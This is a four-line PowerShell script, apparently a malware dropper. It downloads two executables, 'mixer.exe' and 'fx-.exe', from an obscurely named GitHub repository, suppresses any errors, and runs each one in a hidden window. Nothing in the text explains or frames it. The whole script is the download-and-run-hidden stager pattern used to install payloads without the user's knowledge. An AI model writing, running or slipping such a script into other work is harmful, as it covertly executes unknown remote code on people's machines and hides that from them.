Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/mixer.exe" -OutFile "mixer.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "mixer.exe" -WindowStyle Hidden
Invoke-WebRequest -Uri "https://github.com/svhosf/-/raw/refs/heads/main/fx-.exe" -OutFile "fx-.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "fx-.exe" -WindowStyle Hidden
